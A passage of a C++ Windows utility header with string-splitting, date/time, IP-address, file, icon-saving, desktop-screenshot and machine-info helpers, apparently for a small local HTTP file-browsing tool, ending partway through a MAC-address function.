#pragma once
#include "StdAfx.h"
//#include "CppSQLite3_2\Common\CppSQLite3.h"
//#pragma comment(lib, "sqlite3.lib")
#include "HttpSocket.h"
#include <Windows.h>
#include <Iphlpapi.h>
#include <Assert.h>
#include  <WinSock2.h>
#include <shlwapi.h>
#include <process.h>
#pragma comment(lib, "iphlpapi.lib")
#define  NON_NUM '0'
#include<stdio.h>
#include<stdlib.h>
#include "resource.h"
#include<string>
#include<iostream>
#include<io.h>
#include<vector>
#include "atlimage.h"
#include "strCoding.h"
#include<ShellAPI.h>
#include<time.h>
#include "ZBase64.h"
#include<TlHelp32.h>
#include <shlobj.h> 
#include <fstream>
using namespace std;



void PrintError()
{
	LPVOID lpMsgBuf;
	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
		(LPTSTR) &lpMsgBuf,
		0,
		NULL
		);

	// Process any inserts in lpMsgBuf.
	// ...
	// Display the string.
	//MessageBox((LPCTSTR)lpMsgBuf, _T("Error"), MB_OK | MB_ICONINFORMATION );
	OutputDebugString((LPCTSTR)lpMsgBuf);
	// Free the buffer.
	LocalFree( lpMsgBuf );
}



class split
{
public:
	split(const string& p,const char * s=" ")
	{
		length=strlen(p.c_str());
		ssps=p;
		sps=ssps.c_str();
		sp=s;
		reset();

	}
	string trim(const char* ts=" \n\t\v\r",int type=0)
	{
		if(sps)
		{
			const char * temp=sps;
			if(type==0 || type==1)
			{
				for(int i=0;sps[i];i++)
				{
					int j=0;
					for(;ts[j];j++)
					{
						if(ts[j]==sps[i])
						{
							temp++;
							break;
						}
					}
					if(ts[j]==sps[i])
					{
						continue;
					}
					else
					{
						break;
					}
				}
			}
			const char* temq=sps+length-1;
			if(type==0 || type ==2)
			{
				for(;temq>temp;temq--)
				{
					int j=0;
					for(;ts[j];j++)
					{
						if(ts[j]==*temq)
						{
							break;
						}
					}
					if(ts[j]==*temq)
					{
						continue;
					}
					else
					{
						break;
					}
				}
			}
			return string(temp,temq-temp+1);

		}
		return string("");

	}
	bool startwith(const char* sc)
	{
		return (sps && sc && sps[0]==sc[0] && sps==strstr(sps,sc));
	}
	bool endwith(const char* ec)
	{
		if(!ec)return true;
		if(!sps)return false;
		int len=strlen(ec)+1;
		const char * temp=sps+length-len+1;
		return (temp==strstr(temp,ec));
	}
	//将多个相邻的分隔符换成一个
	string uniqe()
	{
		string rets;
		for(int i=0;i<=count;i++)
		{
			if(at(i)!="")
			{
				if(rets!="")rets+=sp;
				rets+=at(i);
			}
		}
		return rets;
	}
	void setchars(const char * s)
	{
		if(s)sp=s;
		reset();
	}
	void reset()
	{
		point=strstr(sps,sp);
		count=recount();
		if(sps && sps[0] && point)
		{
			pointi=0;
			const char* tpoint=strstr(point+strlen(sp),sp);
			if(tpoint && tpoint<sps+length)
			{
				newlen=tpoint-point;
			}
			else
			{
				newlen=(sps+length)-point;
			}
		}
		else 
		{
			pointi=0;
			newlen=0;
		}
	}

	const char* operator[](int i)
	{
		if(point==NULL) return NULL;
		if(i<0 || i>=count)
			return NULL;
		while(i>pointi)add();
		while(i<pointi)dec();
		return point;

	}
	string replace(const char* reps)
	{
		reset();
		string str=at(0);
		for(int i=0;i<count;i++)
		{
			if(reps)
			{
				str.append(reps);
			}
			str.append(at(i+1));
		}
		return str;
	}
	string at(int i)
	{
		if(0==i)
		{
			const char* tpoint=strstr(sps,sp);
			int len=0;
			if(tpoint && tpoint<sps+length)
			{
				len=tpoint-sps;
			}
			else
			{
				len=(sps+length)-sps;
			}
			if(0==len)return string("");
			else
			{
				return string(sps,len);
			}
		}
		else --i;
		const char *p=(*this)[i];
		if(p)
		{	
			p+=strlen(sp);
			if(p>=sps+length)
				return string("");
			return string(p,newlen-strlen(sp));
		}
		return string("");
	}

	int getcount()
	{
		return count+1;
	}
	// 	int getcount()
	// 	{
	// 
	// 	}

protected:
private:
	string ssps;
	const char *sps;
	int length;
	const char * sp;
	int pointi;
	const char *point;
	int newlen;
	int count;
	int recount()
	{
		if(length==0)return 0;
		int i=strlen(sp);
		if(i==0)return 0;
		int counts=0;
		for(const char* ps=sps;ps-sps>=0&&ps-sps<length;ps+=i)
		{
			if(ps=strstr(ps,sp))
				++counts;
			else break;
		}

		return counts;
	}

	const char* add()
	{
		if(point==NULL) return NULL;
		const char* tpoint=strlen(sp)+point;
		if(tpoint<sps+length && tpoint>=sps) 
		{
			tpoint=strstr(tpoint,sp);
			if(tpoint)
			{
				point=tpoint;
				++pointi;
				int len=0;
				//newline获取新值
				const char* ttpoint=strstr(point+strlen(sp),sp);
				if(ttpoint && ttpoint<sps+length)
				{
					newlen=ttpoint-point;
				}
				else
					newlen=sps+length-point;
			}

			return tpoint;
		}
		else
			return NULL;


	}
	const char* dec()
	{
		if(point==NULL) return NULL;
		int i=strlen(sp);
		const char* tpoint=	tpoint=point-i;
		for(;tpoint>=sps&&tpoint<point;tpoint-=i)
		{
			const char * ttpoint=strstr(tpoint,sp);
			if(ttpoint && ttpoint>=sps && ttpoint <= point-i)
			{
				newlen=point-ttpoint;
				point=ttpoint;
				--pointi;
				return ttpoint;
			}
		}
		return NULL;
	}
};

struct TimeSpan
{
	TimeSpan(int i)
	{
		sec=i;
	}
	operator int()
	{
		return sec;
	}
	bool operator > (TimeSpan ts)
	{
		return sec>ts.sec;
	}
	bool operator < (TimeSpan ts)
	{
		return sec<ts.sec;
	}
	bool operator == (TimeSpan ts)
	{
		return sec==ts.sec;
	}
	bool operator > (int ts)
	{
		return sec>ts;
	}
	bool operator < (int ts)
	{
		return sec<ts;
	}
	bool operator == (int ts)
	{
		return sec==ts;
	}
	int sec;
	string ToFormateString()
	{
		int m=sec/60;
		int s=sec%60;
		char buff[20]={0};
		char temp[10];
		sprintf(buff,"%02d:%02d",m,s);
		return string(buff);
	}
	string ToString()
	{
		char buff[30]={0};
		int ts[6]={365*24*3600,30*24*3600,24*3600,60*60,60,1};
		char* cs[6]={"年","月","日","时","分","秒"};

		int t=sec;
		int cup=abs(sec);
		char tmp[8];

		for(int i=0;cup;i++)
			if(t=cup/ts[i])
			{
				sprintf(tmp,"%02d%s\0",t,cs[i]);
				strcat(buff,tmp);
				cup-=t*ts[i];
			}

			if(!buff[0])
			{
				strcpy(buff,"零秒");
			}
			return string(buff);
	}
};
class IPP
{
	unsigned	int address;
public:
	IPP()
	{
	char tempb[16]={0};
	address=IPP(CHttpSocket::GetIP(tempb)).GetValue();
	};
	IPP(unsigned add):address(add){};
	IPP(const string& adds)
	{
		address=0;
		split sp(adds,".");
		if(sp.getcount()==4)
		{
			unsigned N=1;
			for(int i=0;i<4;i++)
			{
				string str=sp.at(3-i);
				address+=atoi(str.c_str())*N;
				N=N<<(8);
			}
		}
	}
	operator const char*()
	{
		return ToString().c_str();
	}
	string ToString()
	{
		string str="";
		unsigned N=255;
		for(int i=0;i<4;i++)
		{
			unsigned	int tempi=(address & N)>>(8*i);
			char buf[4]={0};
			itoa(tempi,buf,10);
			if(str=="")
			{
				str=buf;
			}
			else
			{
				str="."+str;
				str=buf+str;
			}
			N=N<<(8);
		}
		return str;
	}
	unsigned  GetValue() const
	{
		return address;
	}
	bool operator > (const IPP& dt) const
	{
		return address>dt.GetValue();
	}
	bool operator < (const IPP& dt) const
	{
		return address<dt.GetValue();
	}
	bool operator == (const IPP& dt) const
	{
		return address==dt.GetValue();
	}
	bool operator != (const IPP& dt) const
	{
		return address!=dt.GetValue();
	}
};

class DateTime
{
public:
	DateTime()
	{
		date=time(0);
	}
	typedef char (&TimeArg)[20];
	DateTime(char * buff)
	{
		char tbuff[20];
		TimeArg arg=tbuff;
		memcpy(arg,buff,20);
		arg[19]=0;
		formate(arg);
	}
	operator const char*()
	{
		static char buff[20];
		return ToString(buff);
	}
	DateTime(string str)
	{
		char tbuff[20]={0};
		TimeArg arg=tbuff;
		str.copy(arg,20);
		formate(arg);
	}
	string ToString()
	{
		char buff[20];
		tm* timeinfo   =   localtime(&date);
		if(timeinfo)
		{
			sprintf(buff,"%4d-%02d-%02d %02d:%02d:%02d\0",1900+timeinfo->tm_year, 1+timeinfo->tm_mon,
				timeinfo->tm_mday,timeinfo->tm_hour,timeinfo->tm_min,timeinfo->tm_sec);
			return string(buff);
		}
		return string("");

	}
	TimeArg ToString(TimeArg buff)
	{
		tm* timeinfo   =   localtime(&date);
		if(timeinfo)
		{
			sprintf(buff,"%4d-%02d-%02d %02d:%02d:%02d\0",1900+timeinfo->tm_year, 1+timeinfo->tm_mon,
				timeinfo->tm_mday,timeinfo->tm_hour,timeinfo->tm_min,timeinfo->tm_sec);
		}

		return buff;
	}
	DateTime(int v)
	{
		date=v;
	}
	int GetYear()
	{
		return gets()->tm_year+1900;
	}
	int GetMonth()
	{
		return gets()->tm_mon+1;
	}
	int GetDay()
	{
		return gets()->tm_mday;
	}
	int GetHour()
	{
		return gets()->tm_hour;
	}
	int GetMinute()
	{
		return gets()->tm_min;
	}

	bool operator > (DateTime dt)
	{
		return date>dt.GetValue();
	}
	bool operator < (DateTime dt)
	{
		return date<dt.GetValue();
	}
	bool operator == (DateTime dt)
	{
		return date==dt.GetValue();
	}

	TimeSpan operator -(DateTime dt)
	{
		return TimeSpan(int(this->date-dt.GetValue()));
	}
	DateTime operator +(TimeSpan ts)
	{
		DateTime dt=*this;
		dt.date+=ts.sec;
		return dt;
	}
	DateTime operator -(TimeSpan ts)
	{
		DateTime dt=*this;
		dt.date-=ts.sec;
		return dt;
	}
	DateTime& operator +=(TimeSpan ts)
	{
		date+=ts.sec;
		return *this;
	}
	DateTime& operator -=(TimeSpan ts)
	{
		date-=ts.sec;
		return *this;
	}

	//char*()
	//{
	// static buff[20];
	// tm* timeinfo   =   localtime(&date);
	// if(timeinfo)
	// {
	// sprintf(buff,"%4d-%02d-%02d %02d:%02d:%02d\0",1900+timeinfo->tm_year, 1+timeinfo->tm_mon,
	// timeinfo->tm_mday,timeinfo->tm_hour,timeinfo->tm_min,timeinfo->tm_sec);
	// }
	//}
	int GetWeekDay()
	{
		return gets()->tm_wday;
	}
	int GetSecond()
	{
		return gets()->tm_sec;
	}
	int GetValue()
	{
		return date;
	}
	void SetValue(int v)
	{
		date=v;
	}
private:
	void formate(TimeArg arg)
	{
		// char  tokenstring[] arg = "2012-10-22 15:48:38";
		tm timeinfo;
		memset(&timeinfo,0,sizeof(timeinfo));
		split sp(arg," ");
		if(sp.getcount()!=2)return;
		string str1=sp.at(0);
		split sp1(str1.c_str(),"-");
		timeinfo.tm_year=atoi(sp1.at(0).c_str())-1900;
		timeinfo.tm_mon=atoi(sp1.at(1).c_str())-1;
		timeinfo.tm_mday=atoi(sp1.at(2).c_str());
		string str2=sp.at(1);
		split sp2(str2.c_str(),":");
		timeinfo.tm_hour=atoi(sp2.at(0).c_str());
		timeinfo.tm_min=atoi(sp2.at(1).c_str());
		timeinfo.tm_sec=atoi(sp2.at(2).c_str());
		date=mktime(&timeinfo);
	}
	tm* gets()
	{
		return localtime(&date);
	}
	time_t date;
};


class SendFileBlock
{
public:
	IPP ip;
	string filepath;
};

string combine_path(const string& dir,string name)
{
	split sp(dir.c_str(),"/");
	string path=sp.trim("\\/");
	split sp1(name.c_str());
	sp1.trim("\\/");
	if(sp.getcount()==1)
	{
		path+="\\";
		sp1.setchars("\\");
		if(sp1.getcount()==1)
		{
			sp1.setchars("/");
			name=sp1.replace("\\");
		}
	}
	else
	{
		path+="/";
		sp1.setchars("/");
		if(sp1.getcount()==1)
		{
			sp1.setchars("\\");
			name=sp1.replace("/");
		}
	}
	if(name!="")path+=name;
	return path;
}
string get_system_tempdir()
{
	TCHAR buf[MAX_PATH];
	GetTempPath(MAX_PATH, buf);
	return buf;
}
string get_tempdir()
{
	string dir=combine_path(get_system_tempdir(),"http");
	CreateDirectory(dir.c_str(),NULL);
	return dir;
}
string get_curr_path()
{
	char buff[MAX_PATH]={0};
	GetModuleFileName(NULL, buff, MAX_PATH);
	return buff;
}
string get_file_shortname(const string &path);
string get_dest_path()
{
	return combine_path(get_system_tempdir(),get_file_shortname(get_curr_path()));
}

string get_desk_path(const string & comp="")
{
	TCHAR path1[255];
	SHGetSpecialFolderPath(0,path1,CSIDL_DESKTOPDIRECTORY,0);
	return combine_path(path1,comp);
}

bool file_exists(const string &filename)
{
	return std::ifstream(filename.c_str()) != NULL;
}
string get_file_path(const string &path);
bool folder_exists(const string &strPath);
bool create_folder(const string & dir)
{
	string parent_dir=get_file_path(dir);
	if(folder_exists(parent_dir))
		CreateDirectory(dir.c_str(),NULL);
	else
	{
	create_folder(parent_dir);
	CreateDirectory(dir.c_str(),NULL);
	}
	return true;
}
bool delete_file(const string & dir)
{
	return remove(dir.c_str());
}

bool folder_exists(const string &strPath)
{
	WIN32_FIND_DATA wfd;
	bool rValue = false;
	/*HANDLE hFind = FindFirstFile(strPath.c_str(), &wfd);
	if ((hFind != INVALID_HANDLE_VALUE) && (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	{
		rValue = true;  
	}
	FindClose(hFind);
	*/
	//PathIsDirectory(strPath.c_str());
	return PathIsDirectory(strPath.c_str());;
}
vector<string> ListFile(string dir,bool isfile=true);
void delete_folder(const string & dir_path)
{
	//if(!folder_exists(dir))return;
	//string cmd="rd /s /q "+dir;
	//system(cmd.c_str());
	//DeleteDirectory(dir.c_str());
	vector<string> vs1=ListFile(dir_path);
	for(vector<string>::iterator it1  = vs1.begin(); it1 != vs1.end(); ++it1)  
	{ 
		delete_file(*(it1));
	}
	vs1=ListFile(dir_path,false);
	for(vector<string>::iterator it1  = vs1.begin(); it1 != vs1.end(); ++it1)  
	{ 
		delete_folder(*(it1));
	}
	RemoveDirectory(dir_path.c_str());
}

__int64 get_filesize(const string &path)
{
	__int64 size=0;

	//FILE* file = fopen(path.c_str(), "rb");
	//if (file)
	//{
	//	//size = filelength(fileno(file));
	//	fseek(file, 0, SEEK_END);
	//	fgetpos(file,&size);
	//	fclose(file);
	//}
	WIN32_FIND_DATA fileInfo; 
	HANDLE hFind; 
	hFind = FindFirstFile(path.c_str() ,&fileInfo); 
	if(hFind != INVALID_HANDLE_VALUE) 
		size = fileInfo.nFileSizeLow; 
	FindClose(hFind);
	return size;
}
string get_file_shortname(const string &path)
{
	split spn(path.c_str(),"\\");
	string path1=split(spn.replace("/")).trim("/",2);
	split spn1(path1,"/");
	return spn1.at(spn1.getcount()-1);
}
string get_file_path(const string &path)
{
	string tpath=split(path.c_str()).trim("\\/");
	int pos=tpath.find_last_of("/");
	if(string::npos==pos)
	{
		pos=tpath.find_last_of("\\");
	}
	if(string::npos==pos)return "";
	return tpath.substr(0,pos);
}
string get_filetime(const string& path)
{
	WIN32_FIND_DATA             FindFileData;
	FindClose(FindFirstFile(path.c_str(),&FindFileData));
	SYSTEMTIME systemTime;
	char systemTimeBuf[255];
	FileTimeToSystemTime(&(FindFileData.ftLastWriteTime), &systemTime);
	systemTime.wHour = (systemTime.wHour) % 24;   //记着对24取模
	sprintf(systemTimeBuf, "%04d-%02d-%02d %02d:%02d:%02d", systemTime.wYear, systemTime.wMonth, systemTime.wDay, systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
	return systemTimeBuf;
}
struct DataBlock
{
	DataBlock():pt(NULL),size(0){}
	LPCSTR pt;
	DWORD size;
};

int WINAPI DllEntryPoint(HINSTANCE hinst,unsigned long reason, void* lpReserved)
{
	return 1;
}

struct TCursorOrIcon
{
	WORD Reserved;
	WORD wType;
	WORD Count;
};

struct TIconRec
{
	BYTE Width;
	BYTE Height;
	WORD Colors;
	WORD Reserved1;
	WORD Reserved2;
	long DIBSize;
	long DIBOffset;
};

void InitBmpInfoHeader(HBITMAP Bitmap,BITMAPINFOHEADER& BI, int nBit)
{
	int Bytes;
	DIBSECTION DS;

	DS.dsBmih.biSize = 0;
	Bytes = GetObject(Bitmap, sizeof(
		DS), &DS);
	if (Bytes>=sizeof(DS.dsBm)+sizeof(
		DS.dsBmih) && DS.dsBmih.biSize
		>=sizeof(DS.dsBmih))
		memcpy(&BI, &DS.dsBmih, sizeof(
		BITMAPINFOHEADER));
	else {
		memset(&BI, 0, sizeof(BI));
		BI.biSize = sizeof(BI);
		BI.biWidth = DS.dsBm.bmWidth;
		BI.biHeight = DS.dsBm.bmHeight;
		BI.biBitCount = DS.dsBm.bmPlanes
			* DS.dsBm.bmBitsPixel;
	}
	if (nBit!=0) BI.biBitCount = nBit;
	if (BI.biBitCount <= 8)
		BI.biClrUsed = 1<<BI.biBitCount;
	BI.biPlanes = 1;
	if (BI.biClrImportant > BI.biClrUsed)
		BI.biClrImportant = BI.biClrUsed;
	if (BI.biSizeImage == 0)
		BI.biSizeImage = ((BI.biWidth*BI.
		biBitCount+31) / 32) * 4 * BI
		.biHeight;
}

void GetDIBSizes(HBITMAP Bitmap,
	DWORD& InfoSize, DWORD& ImageSize,
	int nBit)
{
	BITMAPINFOHEADER BI;

	InitBmpInfoHeader(Bitmap, BI, nBit);
	InfoSize = sizeof(BITMAPINFOHEADER);
	if (BI.biBitCount > 8) {
		if (BI.biCompression&BI_BITFIELDS)
			InfoSize += 12;
	}
	else
		InfoSize += sizeof(RGBQUAD) * (BI
		.biClrUsed!=0 ? BI.biClrUsed :
		(1 << BI.biBitCount));
	ImageSize = BI.biSizeImage;
}

void GetDIB(HBITMAP Bitmap,
	BITMAPINFO* BmpInfo, void* Bits, int nBit)
{
	HDC DC;

	DC = CreateCompatibleDC(NULL);
	InitBmpInfoHeader(Bitmap, BmpInfo
		->bmiHeader, nBit);
	GetDIBits(DC, Bitmap, 0, BmpInfo
		->bmiHeader.biHeight, Bits,
		BmpInfo, DIB_RGB_COLORS);
	DeleteDC(DC);
} 
BOOL SaveIcon(HICON Icon, LPCSTR FileName, int nBit,bool convert=true)
{
	BOOL ret;
	UINT nColor;
	long Length;
	void *MonoBits;
	void *ColorBits;
	DWORD dwWrite;
	HANDLE hFile;
	TIconRec List;
	ICONINFO IconInfo;
	TCursorOrIcon CI;
	DWORD MonoInfoSize;
	DWORD ColorInfoSize;
	DWORD MonoBitsSize;
	DWORD ColorBitsSize;
	BITMAPINFO *MonoInfo;
	BITMAPINFO *ColorInfo;

	switch(nBit) {
	case 0:
	case 1:
	case 4:
	case 8:
	case 16:
	case 24:
	case 32: break;
	default: return FALSE;
	}
	if (Icon==NULL || !FileName)
		return FALSE;

	hFile = CreateFile(FileName,
		GENERIC_WRITE, FILE_SHARE_READ,
		0, CREATE_ALWAYS, 0, 0);
	if (hFile==INVALID_HANDLE_VALUE)
		return false;
	memset(&CI, 0, sizeof(CI));
	memset(&List, 0, sizeof(List));
	GetIconInfo(Icon, &IconInfo);

	GetDIBSizes(IconInfo.hbmMask,
		MonoInfoSize, MonoBitsSize, 1);
	GetDIBSizes(IconInfo.hbmColor,
		ColorInfoSize, ColorBitsSize,
		nBit);
	MonoInfo = (BITMAPINFO*)malloc(
		MonoInfoSize);
	ColorInfo = (BITMAPINFO*)malloc(
		ColorInfoSize);
	MonoBits = malloc(MonoBitsSize);
	ColorBits = malloc(ColorBitsSize);
	GetDIB(IconInfo.hbmMask, MonoInfo,
		MonoBits, 1);
	GetDIB(IconInfo.hbmColor, ColorInfo,
		ColorBits, nBit);
	CI.wType = 0x10001; CI.Count = 1;
	ret &= WriteFile(hFile, &CI, sizeof(CI),
		&dwWrite, NULL);
	List.Width = ColorInfo->bmiHeader.biWidth;
	List.Height = ColorInfo->bmiHeader.biHeight;
	List.Colors = ColorInfo->bmiHeader.biPlanes
		* ColorInfo->bmiHeader.biBitCount;
	List.DIBSize = ColorInfoSize + ColorBitsSize
		+ MonoBitsSize;
	List.DIBOffset = sizeof(CI) + sizeof(List);
	ret &= WriteFile(hFile, &List, sizeof(List),
		&dwWrite, NULL);
	ColorInfo->bmiHeader.biHeight *= 2;
	ret &= WriteFile(hFile, ColorInfo,
		ColorInfoSize, &dwWrite, NULL);
	ret &= WriteFile(hFile, ColorBits,
		ColorBitsSize, &dwWrite, NULL);
	ret &= WriteFile(hFile, MonoBits,
		MonoBitsSize, &dwWrite, NULL);
	free(ColorInfo); free(MonoInfo);
	free(ColorBits); free(MonoBits);
	DeleteObject(IconInfo.hbmColor);
	DeleteObject(IconInfo.hbmMask);
	CloseHandle(hFile);
	if(convert)
	{
		CImage ci;
		string dir=get_file_path(FileName);
		string name=get_file_shortname(FileName);
		split sp(name.c_str(),".");
		if(sp.getcount()!=1)
		{
			ci.Load(FileName);
			string icon_path=sp.at(0)+".png";
			ci.Save(combine_path(dir,icon_path).c_str());
			remove(FileName);
		}
	}
	return ret;
}

vector<string> ListFile(string dir,bool isfile)
{
	CFileFind finder;
	split sp(dir.c_str(),"\\");
	dir=split(sp.trim("/\\").c_str(),"\\").replace("/")+"/";

	BOOL bWorking = finder.FindFile((dir+"*").c_str());
	vector<string> vs;
	while (bWorking)
	{
		bWorking = finder.FindNextFile();
		string path=combine_path(dir,(LPCTSTR)finder.GetFileName());
		if(isfile)
		{
			if(!finder.IsDirectory())
				vs.push_back(path);
		}else
		{
			if(finder.IsDirectory() && !finder.IsDots())
				vs.push_back(path);
		}
	} 
	return vs;
}
vector<string> GetComputerDisk() //获取本地电脑的磁盘符号
{
	TCHAR buf[100];
	DWORD len = GetLogicalDriveStrings(sizeof(buf)/sizeof(TCHAR),buf);
	TCHAR *s = buf;
	UINT IsCDRom;
	vector<string> vs;
	for (; *s; s+=_tcslen(s)+1)
	{
		vs.push_back(split(s).trim("\\",2));
	}
	return vs;
} 
void CastImage(string path)
{
	if(file_exists(path))return;
	string dir=get_file_path(path);
	if(!folder_exists(dir))
	{
		create_folder(dir);
	}
	CImage img;
	CString filename;
	CRect   rect;
	::GetWindowRect(::GetDesktopWindow(),&rect);

	int rw=rect.Width();
	int rh=rect.Height();
	


	HWND hDesktopWnd = ::GetDesktopWindow();
	HDC hDesktopDC = ::GetDC(hDesktopWnd);
	HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
	HBITMAP hCaptureBitmap =CreateCompatibleBitmap(hDesktopDC,
		rw, rh);
	SelectObject(hCaptureDC,hCaptureBitmap);
	StretchBlt(hCaptureDC,0,0,rw, rh,hDesktopDC,0,0,rw,rh,SRCCOPY);
	///图像保存为图像文件
	img.Attach(hCaptureBitmap);
	filename.Format(path.c_str());
	img.Save(filename);

	::ReleaseDC(hDesktopWnd,hDesktopDC);
	DeleteDC(hCaptureDC);
	DeleteObject(hCaptureBitmap);
}
string ExtractStr(string resource, string name, string stas, string ends, int ids = 1)
{
	string str = "";
	int index = 0;
	//首先定位到名称
	while (ids != 0)
	{
		ids--;
		int bgn = resource.find(name, index);
		//如果未找到直接返回
		if (bgn != -1)
		{
			//再次定位到开始字符
			int sta = resource.find(stas, bgn + name.length());
			if (sta != -1)
			{
				//建立栈结构,开始字符和结束字符分别进行压栈出栈
				int i = 1;
				sta += stas.length()-1;
				index = sta + 1;
				string tmps = "";
				while (0 != i && index < resource.length())
				{

					if (index + ends.length() > resource.length()) break;
					tmps = resource.substr(index, ends.length());
					if (tmps == ends)
					{
						i--;
						if (0 == i) break;
						index++;
						continue;
					}
					if (index + stas.length() > resource.length()) break;
					tmps = resource.substr(index, stas.length());
					if (tmps == stas)
					{
						i++;
					}
					index++;
				}
				if (0 == i && index <= resource.length())
				{
					str += resource.substr(sta + 1, index - sta - 1);
					if (ids != 0) str += ",";
				}
			}
		}
	}
	return str;
}

DataBlock FindResourcePoint(int id,LPCSTR type)
{
	DataBlock db;
	db.pt="Resource No Found!";
	HRSRC hRsrc = FindResource(NULL,MAKEINTRESOURCE(id),type);
	if (NULL != hRsrc)
	{
		//获取资源的大小
		db.size = SizeofResource(NULL, hRsrc);
		if (0 != db.size)
		{
			//加载资源
			HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
			if (NULL != hGlobal)
			{
				//锁定资源
				db.pt =(LPCSTR)LockResource(hGlobal);
				//if (NULL != pBuffer)
				//{
				////	OutputDebugString(pBuffer);
				//}
			}
		}
	}
	return db;
}

void GetIcon(const string& dot,const string& icon_path)
{
	if(!file_exists(icon_path))
	{
		HRESULT hresut=CoInitialize(NULL);
		SHFILEINFO shfi; 
		// SHFILEINFO shfi;

		SHGetFileInfo((LPCTSTR)_T(dot.c_str()),FILE_ATTRIBUTE_NORMAL,&shfi,sizeof(SHFILEINFO)
			,SHGFI_SYSICONINDEX
			|SHGFI_ICON
			|SHGFI_USEFILEATTRIBUTES
			|SHGFI_DISPLAYNAME 
			|SHGFI_TYPENAME 
			|SHGFI_SMALLICON );
		SaveIcon(shfi.hIcon,icon_path.c_str(),8);
		CoUninitialize();
	}
}
void WriteFileByPoint(LPCSTR lp,const string& path,ULONG length=0)
{
	if(length==0)length=strlen(lp);
	if(lp!=NULL)
	{
		FILE *stream;
		if ((stream = fopen(path.c_str(), "wb")) != NULL) /* open file TEST.$$$ */
		{
			fwrite(lp,length, 1, stream);
			fclose(stream); 
		}
	}
}
#pragma pack(1)
typedef struct _GRPICONDIRENTRY {
	BYTE   bWidth;               // Width, in pixels, of the image
	BYTE   bHeight;              // Height, in pixels, of the image
	BYTE   bColorCount;          // Number of colors in image (0 if >=8bpp)
	BYTE   bReserved;            // Reserved
	WORD   wPlanes;              // Color Planes
	WORD   wBitCount;            // Bits per pixel
	DWORD   dwBytesInRes;         // how many bytes in this resource?
	WORD   nID;                  // the ID
} GRPICONDIRENTRY, *LPGRPICONDIRENTRY;

typedef struct  _GRPICONDIR {
	WORD            idReserved;   // Reserved (must be 0)
	WORD            idType;       // Resource type (1 for icons)
	WORD            idCount;      // How many images?
	GRPICONDIRENTRY   idEntries[1]; // The entries for each image
} GRPICONDIR, *LPGRPICONDIR;
#pragma pack()
void FavIcon()
{
	DataBlock lp;
	string temp=get_tempdir();
	string path=combine_path(temp,"favicon.ico");
	if(!file_exists(path))
	{

		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDI_ICON1), RT_GROUP_ICON);
		HGLOBAL hGlobal = LoadResource(NULL, hRes);
		LPVOID lpIconDir = LockResource(hGlobal);
		hRes = FindResource(NULL, MAKEINTRESOURCE(((LPGRPICONDIR)lpIconDir)->idEntries[0].nID ), RT_ICON);
		lp.size = SizeofResource(NULL, hRes);
		hGlobal = LoadResource(NULL, hRes);
		lp.pt = (LPCSTR)LockResource(hGlobal);
		PrintError();
		if(lp.size)
			{
				WriteFileByPoint(lp.pt,path,lp.size);
				HICON hIcon = CreateIconFromResource((LPBYTE) lp.pt, lp.size, TRUE, 0x00030000 );
				SaveIcon(hIcon,path.c_str(),4,false);
		}
	}
}
void IniIcon()
{
	DataBlock lp;
	string temp=get_tempdir();
	string path=combine_path(temp,"drive.png");
	if(!file_exists(path))
	{
		lp=FindResourcePoint(IDB_DRIVE,"PNG");
		if(lp.size)WriteFileByPoint(lp.pt,path,lp.size);
	}
	path=combine_path(temp,"folder.png");
	if(!file_exists(path))
	{
		lp=FindResourcePoint(IDB_FOLDER,"PNG");
		if(lp.size)WriteFileByPoint(lp.pt,path,lp.size);
	}
	path=combine_path(temp,"file.png");
	if(!file_exists(path))
	{
		lp=FindResourcePoint(IDB_FILE,"PNG");
		if(lp.size)WriteFileByPoint(lp.pt,path,lp.size);
	}
	path=combine_path(temp,"home.png");
	if(!file_exists(path))
	{
		lp=FindResourcePoint(IDB_HOME,"PNG");
		if(lp.size)WriteFileByPoint(lp.pt,path,lp.size);
	}
	FavIcon();
	path=combine_path(temp,"main.css");
	if(!file_exists(path))
	{
		lp=FindResourcePoint(IDR_CSS1,"CSS");
		if(lp.size)WriteFileByPoint(lp.pt,path,lp.size);
	}

}
static void PrintMACaddress(unsigned char MACData[],char* buff)
{
	sprintf(buff,"%02X:%02X:%02X:%02X:%02X:%02X", 
		MACData[0], MACData[1], MACData[2], MACData[3], MACData[4], MACData[5]);
}

static char ToHex(int a)
{
	char buff[10];
	sprintf(buff,"%X",a);
	return buff[0];
	/*
	if (a >= 0 && a <= 15)
	switch (a)
	{
	case 15: return "F";
	case 14: return "E";
	case 13: return "D";
	case 12: return "C";
	case 11: return "B";
	case 10: return "A";
	default: return a.ToString();
	}
	else return "";
	*/
}
static char * EncodeDefault(const char* rs,char * rss)
{
	// byte[] bs = System.Text.Encoding.Default.GetBytes(rs);
	//string rss = "";
	int j=0;
	for (int i = 0; i < strlen(rs) ; i++)
	{
		rss[j++] = '%';
		rss[j++]= ToHex(rs[i] / 16);
		rss[j++]= ToHex(rs[i] % 16);
	}
	rss[j++]=0;
	return rss;
}
static int  NowDate()
{
	time_t   now; 
	struct   tm*   ptm; 
	now   =   time(0); 

	ptm   =   localtime(&now);

	return ptm->tm_yday+1; 
}

static string GetTime()
{
	char buff[20];
	time_t   now; 
	struct   tm*   timeinfo; 
	now   =   time(0); 
	timeinfo   =   localtime(&now);
	sprintf (buff,"%4d-%02d-%02d %02d:%02d:%02d\0",1900+timeinfo->tm_year, 1+timeinfo->tm_mon,
		timeinfo->tm_mday,timeinfo->tm_hour,timeinfo->tm_min,timeinfo->tm_sec);
	return string(buff);
}
static string GetNowPath(string type="",string time="")
{
	if(time=="")time=GetTime();
	split sp(time.c_str(),":");
	return combine_path(combine_path(get_tempdir(),"img/"),sp.replace("-")).append(type);
}
static char * GetName(char * chBuf)  
{
	int dwRet=MAX_COMPUTERNAME_LENGTH+1;  
	gethostname(chBuf,dwRet); 
	return chBuf;
}

// Fetches the MAC address and prints it
static char * GetMACaddress(char* buff)
{
	IP_ADAPTER_INFO AdapterInfo[16];			// Allocate information for up to 16 NICs
